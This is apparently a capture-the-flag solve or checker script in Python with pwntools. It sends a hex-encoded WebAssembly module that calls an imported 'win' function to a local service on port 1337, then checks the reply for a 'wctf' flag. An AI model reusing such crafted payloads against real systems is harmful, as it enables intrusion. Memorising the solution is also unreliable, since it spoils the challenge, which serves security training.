#!/usr/bin/env python3
from time import sleep
from pwn import *

def main():
    r = remote("127.0.0.1", 1337)
    r.sendline(b'0061736d0100000001150460047f7f7f7f016f60016f016f60016f00600000022904016905417272617900000169064275666665720001016906537472696e67000101690377696e000203020103070801046d61696e00040a1801160041f001419f0141a50141ba0110001001100210030b')
    
    sleep(1)
    out = r.recv(1024)
    print(out)

    if (b'wctf' in out):
        exit(0)
    else:
        exit(1)

if __name__ == "__main__":
    main()
